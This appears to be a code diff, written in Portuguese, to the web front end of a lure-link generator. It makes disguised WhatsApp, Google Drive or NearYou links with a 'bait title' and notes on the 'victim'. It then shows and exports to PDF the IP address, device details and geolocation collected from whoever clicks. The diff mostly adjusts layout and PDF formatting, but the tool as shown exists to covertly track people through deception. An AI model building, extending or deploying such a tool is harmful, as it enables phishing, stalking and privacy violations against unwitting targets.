@@ -10,24 +10,32 @@
             font-family: system-ui, sans-serif; 
             background-color: #f0f2f5; 
             display: flex; 
-            /* MODIFICAÇÃO CHAVE: Remove flex-direction: column e centraliza horizontalmente */
-            justify-content: center; 
-            align-items: flex-start; /* Alinha no topo para que o conteúdo comece junto */
+            justify-content: center; /* Centraliza horizontalmente o conteúdo total */
+            align-items: flex-start; /* Alinha os blocos no topo */
             min-height: 100vh; 
             margin: 0; 
             padding: 20px; 
-            gap: 20px; /* Espaço entre as colunas */
+            gap: 20px; /* Espaço ENTRE a coluna esquerda e o display de rastreamento */
+        }
+
+        /* NOVO: Wrapper para a coluna da esquerda (Gerador + Consulta) */
+        #left-column {
+            display: flex;
+            flex-direction: column; /* Empilha os itens verticalmente */
+            gap: 20px; /* Espaço ENTRE o Gerador e a Consulta */
+            width: 100%; /* Ocupa a largura total disponível na coluna */
+            max-width: 450px; /* Mantém a largura máxima dos containers */
+            flex-shrink: 0; /* Impede que a coluna encolha */
         }
         
-        /* Contêiner principal do Gerador de Link E Consulta */
+        /* Container principal (usado por Gerador e Consulta) */
         .container { 
             background: white; 
             padding: 2rem 2.5rem; 
             border-radius: 12px; 
             box-shadow: 0 6px 20px rgba(0,0,0,0.08); 
-            width: 100%; 
-            max-width: 450px; 
-            flex-shrink: 0; /* Impede que encolha */
+            width: 100%; /* Garante que ocupem a largura da #left-column */
+            box-sizing: border-box; /* Inclui padding na largura total */
         }
         
         h1, h2 { text-align: center; color: #1c1e21; margin-top: 0; margin-bottom: 1.5rem;}
@@ -43,7 +51,7 @@
         .input-group button { width: auto; border-top-left-radius: 0; border-bottom-left-radius: 0; }
         .status { margin-top: 1rem; text-align: center; color: #65676b; }
         
-        /* NOVO LAYOUT PARA RASTREAMENTO */
+        /* Layout do Display de Rastreamento (mantido) */
         #tracking-display {
             background: white;
             padding: 2rem;
@@ -52,11 +60,11 @@
             width: 100%;
             max-width: 800px; 
             min-height: 400px; /* Ajuda a dar uma forma inicial */
-            margin-top: 0; /* Remove margem superior desnecessária */
+            /* margin-top: 0; /* Não mais necessário */
             display: none;
             text-align: left;
-            /* CHAVE: Permite que o display de rastreamento use o espaço restante */
-            flex-grow: 1; 
+            flex-grow: 1; /* Permite que o display use o espaço restante */
+            box-sizing: border-box; /* Inclui padding na largura total */
         }
 
         #tracking-display h2 {
@@ -92,66 +100,73 @@
             margin-bottom: 10px;
         }
 
-        /* Adiciona responsividade básica para telas pequenas */
-        @media (max-width: 1200px) {
+        /* Responsividade (ajustada) */
+        @media (max-width: 1200px) { /* Ajuste este valor se necessário */
             body {
-                flex-direction: column;
-                align-items: center;
-                gap: 20px; /* Aumenta o gap na vertical */
+                flex-direction: column; /* Empilha tudo verticalmente em telas menores */
+                align-items: center; /* Centraliza os blocos */
+                gap: 20px; 
+            }
+            #left-column {
+                 max-width: 90%; /* Coluna esquerda ocupa mais largura */
+                 width: 100%; /* Garante que ocupe a largura disponível */
+                 align-items: center; /* Centraliza containers dentro da coluna */
             }
             .container, #tracking-display {
-                max-width: 90%;
+                max-width: 100%; /* Ocupam a largura total da coluna pai */
+                width: 100%;
             }
-            /* Garante que a seção de busca não fique colada no gerador */
-            #search-container {
-                margin-top: 0; 
-            }
+             #tracking-display {
+                 margin-top: 0; /* Remove margem extra em telas pequenas */
+             }
         }
     </style>
 </head>
 <body>
-    <div class="container"> <h1>Gerador de Link</h1>
-        <div class="form-group">
-            <label for="template">Template:</label>
-            <select id="template">
-                <option value="2">WhatsApp</option>
-                <option value="1">Google Drive</option>
-                <option value="0">NearYou</option>
-            </select>
-        </div>
-        <div class="form-group">
-            <label for="groupTitle">Título da Isca:</label>
-            <input type="text" id="groupTitle" placeholder="Ex: Vaga de Emprego Urgente">
-        </div>
-        <div class="form-group">
-            <label for="linkDescription">Descrição (Anotações):</label>
-            <textarea id="linkDescription" rows="3" placeholder="Ex: Vítima 1, Teste 01/01/2026, Enviado via Telegram."></textarea>
-        </div>
-        <div class="form-group">
-            <label for="groupImage">Imagem do Grupo (opcional):</label>
-            <input type="file" id="groupImage" accept="image/png, image/jpeg">
-        </div>
-        <button id="generateBtn">Gerar Link</button>
+    <div id="left-column"> 
         
-        <div class="status" id="status-text"></div>
-
-        <div id="result-container">
-            <label for="result-url">Link Gerado:</label>
-            <div class="input-group">
-                <input type="text" id="result-url" readonly>
-                <button id="copy-btn">Copiar</button>
+        <div class="container"> <h1>Gerador de Link</h1>
+            <div class="form-group">
+                <label for="template">Template:</label>
+                <select id="template">
+                    <option value="2">WhatsApp</option>
+                    <option value="1">Google Drive</option>
+                    <option value="0">NearYou</option>
+                </select>
             </div>
+            <div class="form-group">
+                <label for="groupTitle">Título da Isca:</label>
+                <input type="text" id="groupTitle" placeholder="Ex: Vaga de Emprego Urgente">
+            </div>
+            <div class="form-group">
+                <label for="linkDescription">Descrição (Anotações):</label>
+                <textarea id="linkDescription" rows="3" placeholder="Ex: Vítima 1, Teste 01/01/2026, Enviado via Telegram."></textarea>
+            </div>
+            <div class="form-group">
+                <label for="groupImage">Imagem do Grupo (opcional):</label>
+                <input type="file" id="groupImage" accept="image/png, image/jpeg">
+            </div>
+            <button id="generateBtn">Gerar Link</button>
+            
+            <div class="status" id="status-text"></div>
+
+            <div id="result-container">
+                <label for="result-url">Link Gerado:</label>
+                <div class="input-group">
+                    <input type="text" id="result-url" readonly>
+                    <button id="copy-btn">Copiar</button>
+                </div>
+            </div>
+        </div> <div class="container" id="search-container">
+            <h2>Consultar Rastreamento</h2>
+            <div class="form-group">
+                <label for="search-id-input">ID de Rastreamento:</label>
+                <input type="text" id="search-id-input" placeholder="Cole o ID aqui">
+            </div>
+            <button id="search-btn">Buscar</button>
+            <div class="status" id="search-status" style="margin-top: 1rem;"></div>
         </div>
-    </div> <div class="container" id="search-container">
-        <h2>Consultar Rastreamento</h2>
-        <div class="form-group">
-            <label for="search-id-input">ID de Rastreamento:</label>
-            <input type="text" id="search-id-input" placeholder="Cole o ID aqui">
-        </div>
-        <button id="search-btn">Buscar</button>
-        <div class="status" id="search-status" style="margin-top: 1rem;"></div>
-    </div>
-    <div id="tracking-display"> <h2>Status de Rastreamento: <span id="current-tracking-id">N/A</span></h2>
+        </div> <div id="tracking-display"> <h2>Status de Rastreamento: <span id="current-tracking-id">N/A</span></h2>
         <button id="export-pdf-btn" style="margin-top: 20px; background-color: #dc3545;" disabled>Exportar como PDF</button>
 
         <div id="tracking-status-message" class="status-header">Aguardando geração ou consulta...</div>
@@ -557,8 +572,6 @@
             if (indexA !== -1 && indexB !== -1) return indexA - indexB; // Ordena por locationOrder
             if (indexA !== -1) return -1; // Chaves de locationOrder vêm primeiro
             if (indexB !== -1) return 1;
-            // Para outras chaves, mantém a ordem ou ordena alfabeticamente
-            // return a.localeCompare(b); // Descomente para ordenar alfabeticamente as demais
              return 0; // Mantém ordem original das demais
         });
         
@@ -595,8 +608,12 @@
             })
             .then(data => {
                 if (data.status !== 'RECEIVED') {
-                    alert("Ainda não há dados recebidos para este ID.");
-                    return;
+                    alert("Ainda não há dados recebidos para este ID ou o ID é inválido.");
+                     // Adiciona verificação extra para dados realmente existentes
+                     if (!data.clientIp && !data.info && !data.result && !data.error) {
+                         console.warn("[PDF Export] Tentativa de exportar ID sem dados recebidos.");
+                         return;
+                     }
                 }
 
                 const { jsPDF } = window.jspdf;
@@ -615,59 +632,64 @@
                 
                 // --- TÍTULO GERAL E ID ---
                 doc.setFontSize(16);
-                doc.text(`Relatório de Rastreamento`, 10, yOffset);
+                doc.text(`Relatório de Rastreamento`, doc.internal.pageSize.width / 2, yOffset, { align: 'center' });
                 yOffset += 8;
                 doc.setFontSize(10);
-                doc.setTextColor(100); // Cinza
-                doc.text(`Tracking ID: ${activeTrackingId}`, 10, yOffset);
+                doc.setTextColor(100); 
+                doc.text(`Tracking ID: ${activeTrackingId}`, doc.internal.pageSize.width / 2, yOffset, { align: 'center' });
                 yOffset += 10;
-                doc.setTextColor(0); // Preto
+                doc.setTextColor(0); 
 
                 // --- DESCRIÇÃO DA ISCA ---
                 if (data.title || data.description) {
-                     checkNewPage(20); // Altura estimada para esta seção
+                     checkNewPage(20); 
                     doc.setFontSize(12);
+                    doc.setFont(undefined, 'bold');
                     doc.text('Descrição da Isca', 10, yOffset);
-                    yOffset += 6;
+                    yOffset += 7;
                     doc.setFontSize(10);
-                    
-                    doc.setFont(undefined, 'bold');
-                    doc.text(`Título:`, 10, yOffset);
                     doc.setFont(undefined, 'normal');
-                    doc.text(`${data.title || 'N/A'}`, 30, yOffset);
+                    
+                    doc.setFont(undefined, 'bold'); doc.text(`Título:`, 10, yOffset);
+                    doc.setFont(undefined, 'normal'); doc.text(`${data.title || 'N/A'}`, 40, yOffset);
                     yOffset += 6;
                     
-                    doc.setFont(undefined, 'bold');
-                    doc.text(`Anotações:`, 10, yOffset);
+                    doc.setFont(undefined, 'bold'); doc.text(`Anotações:`, 10, yOffset);
                     doc.setFont(undefined, 'normal');
                     const annotations = data.description || 'Nenhuma anotação fornecida.';
-                    const textLines = doc.splitTextToSize(annotations, 170); // Largura um pouco menor
-                    doc.text(textLines, 30, yOffset);
-                    yOffset += (textLines.length * 5) + 5; 
+                    const textLines = doc.splitTextToSize(annotations, doc.internal.pageSize.width - 20 - 30); // Largura da página - margens - recuo
+                    doc.text(textLines, 40, yOffset);
+                    yOffset += (textLines.length * 5) + 6; 
                 }
 
                 const headStyles = { fillColor: [220, 220, 220], textColor: [0, 0, 0], fontStyle: 'bold' };
                 const tableConfig = {
-                    startY: yOffset + 4,
+                    startY: yOffset + 4, // Y inicial da tabela
                     head: [['Campo', 'Valor']],
                     theme: 'striped',
-                    styles: { fontSize: 9, cellPadding: 2 },
+                    styles: { fontSize: 9, cellPadding: 2, overflow: 'linebreak' }, // overflow para quebrar texto longo
                     headStyles: headStyles,
-                    columnStyles: { 0: { fontStyle: 'bold', cellWidth: 50 } }, // Ajuste cellWidth conforme necessário
-                    margin: { left: 10, right: 10 },
-                    didDrawPage: (hookData) => { yOffset = hookData.cursor.y; } // Atualiza yOffset após desenhar
+                    columnStyles: { 
+                        0: { fontStyle: 'bold', cellWidth: 50 }, // Coluna Campo
+                        1: { cellWidth: 'auto'} // Coluna Valor ajusta automaticamente
+                    },
+                    margin: { left: 10 }, // Só margem esquerda, autoTable cuida da direita
+                    tableWidth: 'auto', // Largura da tabela se ajusta ao conteúdo
+                    didDrawPage: (hookData) => { yOffset = hookData.cursor.y; } // Atualiza yOffset global
                 };
 
                 // --- DADOS DE REDE E DISPOSITIVO (TABELA 1) ---
-                 checkNewPage(20); // Estimativa inicial para título + algumas linhas
+                 checkNewPage(20); 
                 doc.setFontSize(12);
+                doc.setFont(undefined, 'bold');
                 doc.text('Dados de Coleta (Rede e Dispositivo)', 10, yOffset);
-                yOffset += 2;
+                yOffset += 1; // Menos espaço após título da seção
+                doc.setFont(undefined, 'normal');
                 
                 const combinedData = { ...(data.clientIp ? { clientIp: data.clientIp } : {}), ...data.info };
                 if (Object.keys(combinedData).length > 0) {
                     doc.autoTable({ ...tableConfig, body: objectToTableData(combinedData) });
-                    // yOffset é atualizado pelo hook didDrawPage
+                    yOffset = doc.autoTable.previous.finalY; // Pega o Y final da tabela desenhada
                 } else {
                      doc.setFontSize(9);
                      doc.text("Nenhum dado de rede/dispositivo coletado.", 10, yOffset + 6);
@@ -676,18 +698,20 @@
 
                 // --- DADOS DE LOCALIZAÇÃO (TABELA 2) ---
                 if (data.result || data.error) {
-                     checkNewPage(20); // Estimativa inicial
-                     yOffset += 10; // Espaço antes da próxima seção
+                     yOffset += 8; // Espaço antes da próxima seção
+                     checkNewPage(20); 
                     doc.setFontSize(12);
+                     doc.setFont(undefined, 'bold');
                     doc.text(data.result ? 'Resultados de Geolocalização' : 'Erro de Geolocalização', 10, yOffset);
-                    yOffset += 2;
+                    yOffset += 1;
+                     doc.setFont(undefined, 'normal');
 
                     const locationResultStore = data.result || data.error;
                     doc.autoTable({ ...tableConfig, startY: yOffset + 4, body: objectToTableData(locationResultStore) });
-                    // yOffset é atualizado pelo hook didDrawPage
-                } else {
+                    yOffset = doc.autoTable.previous.finalY;
+                } else if (Object.keys(combinedData).length > 0) { // Só mostra se a tabela anterior foi mostrada
+                     yOffset += 8;
                      checkNewPage(10);
-                     yOffset += 10;
                      doc.setFontSize(9);
                      doc.text("Nenhum dado de geolocalização recebido.", 10, yOffset);
                      yOffset += 10;
@@ -697,7 +721,7 @@
                 doc.save(`Rastreamento_${activeTrackingId}.pdf`);
 
             }).catch(error => {
-                alert('Falha ao buscar dados para exportação PDF: ' + error.message);
+                alert('Falha ao gerar PDF: ' + error.message);
                 console.error('PDF Export Error:', error);
             });
     });
